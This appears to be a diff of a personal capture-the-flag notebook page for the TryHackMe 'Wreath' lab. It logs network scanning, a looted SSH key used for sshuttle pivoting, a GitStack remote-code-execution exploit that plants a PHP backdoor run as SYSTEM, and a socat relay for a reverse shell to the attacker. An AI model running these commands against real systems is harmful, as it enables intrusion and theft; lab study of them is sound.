@@ -3,6 +3,17 @@ title: "wreath"
 tags:
   - fetus
 ---
+## scope:
+- 10.200.180.0/24
+```sh
+nmap -sn 10.200.180.0/24
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 13:32 -0500
+Nmap scan report for thomaswreath.thm (10.200.180.200)
+Host is up (0.22s latency).
+Nmap scan report for 10.200.180.250
+Host is up (0.22s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 39.07 seconds
+```
 ## initial recon on the prod-serv:
 - a scan results:
 ```sh fold title:Ascan
@@ -155,11 +166,12 @@ mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
 ```
 
 #### internal network enum:
-- transferred a static nmap binary by doing this at `/tmp`:
+- downloaded a static nmap binary
 ```sh
 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
 ```
-
+- uploaded to pwned machine via hosting a python http server and doing `curl myIP/nmap -o /tmp/nmap-vorpidi && chmod 777 nmap-vorpidi` 
+- hostscan
 ```sh
 ./nmap-vorpidi -sn 10.200.180.0/24 -oN scan
 
@@ -182,7 +194,129 @@ Nmap scan report for ip-10-200-180-200.eu-west-1.compute.internal (10.200.180.20
 Host is up.
 Nmap done: 256 IP addresses (5 hosts up) scanned in 4.82 seconds
 ```
-
+- 1, 250 are out of scope since 1 is aws and 250 is openvpn. leaves us with `10.200.180.100` and `10.200.180.150`
+- scanned the hosts. `100` returns all ports as filtered: 
 ```sh
-./nmap -sn 10.200.180.0/24 -oN scan
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-03-01 20:03 GMT
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-180-150.eu-west-1.compute.internal (10.200.180.150)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00071s latency).
+Not shown: 5903 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
 ```
+- looted an ssh priv key from the pwned box as well. used it with [[sshuttle]] to pivot 
+```sh
+sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa" 10.200.180.0/24 -x 10.200.180.200
+```
+- cant really scan but i can access the site from here at least <br>
+![[wreathGitstackSS.png]]
+- its a gitstack server apparently. login page at `/registration/login`: <br>
+![[wreathGitstackLoginSS.png]]
+- default creds didnt work
+- searched on [[msfconsole]]. used a module. 
+```sh
+msf auxiliary(admin/http/gitstack_rest) > run
+[*] Running module against 10.200.180.150
+[*] Retrieving Users
+[+] twreath
+[*] Auxiliary module execution completed
+msf auxiliary(admin/http/gitstack_rest) > run
+[*] Running module against 10.200.180.150
+[+] SUCCESS: msf:password
+[+] User msf added to Website
+[*] Auxiliary module execution completed
+```
+- didnt work
+- tried some others. didnt work. tried the last one from the searchsploit output. seems to error. ran it through [[dos2unix]] to fix line endings to unix ones. changed the target ip in the code. added the shebang line because why not. ran it. got this output. seems to run as `nt authority\system` :)
+```sh
+╭─[~/projects/wreath]─[root@DEMONDAYZ]─[0]─[6452]
+╰─[:)] # ./43777unix.py 
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
+[+] Execute command
+"nt authority\system"
+```
+- the executed command set in the script was `whoami`
+- lets use the created exploitable file instead of running the script over and over again. the path to it is `c:\GitStack\gitphp\exploit.php` which shows up as `http://10.200.180.150/web/exploit.php` with [[curl]]
+```sh
+curl -X POST http://10.200.180.150/web/exploit.php -d "a=dir"
+```
+- task asks if i can adapt this into a full pseudoshell env. i sure can since this is using php. lets use [[webshells]] :)
+- you know what im too lazy lets just get this done first ill do it later
+- immediately do `systeminfo`
+```c fold title:sysinfo
+╭─[~/projects/wreath]─[root@DEMONDAYZ]─[0]─[6493]
+╰─[:)] # curl -X POST http://10.200.180.150/web/exploit.php -d "a=systeminfo"
+Host Name:                 GIT-SERV
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-70000-00000-AA159
+Original Install Date:     08/11/2020, 13:19:49
+System Boot Time:          02/03/2026, 01:33:00
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 24/08/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,383 MB
+Virtual Memory: Max Size:  2,432 MB
+Virtual Memory: Available: 1,887 MB
+Virtual Memory: In Use:    545 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 5 Hotfix(s) Installed.
+                           [01]: KB4580422
+                           [02]: KB4512577
+                           [03]: KB4580325
+                           [04]: KB4587735
+                           [05]: KB4592440
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.200.180.1
+                                 IP address(es)
+                                 [01]: 10.200.180.150
+                                 [02]: fe80::25e9:15d8:d963:3897
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed. 
+```
+- test if pwned machine can access us by pinging our attacker ip from the pwned machine and setting up an icmp listener with [[tcpdump]] 
+```sh
+tcpdump -i tun0 icmp
+```
+- it cant. lets move on. added firewall port exception for the reverse shell relay on the `200` initial compromised machine
+```sh
+firewall-cmd --zone=public --add-port 1337/tcp
+```
+- downloaded some static bins from this repo that also has [[socat]] for our purposes: `https://github.com/Xhoenix/static-bins.git` 
+- transferred said socat bin to the `prod-server` and set up the relay 
+```sh
+./socat tcp-l:1337 tcp:10.250.180.7:1337 &
+```
+- set up the python webhost for the revshell transfer to the `git-server` 
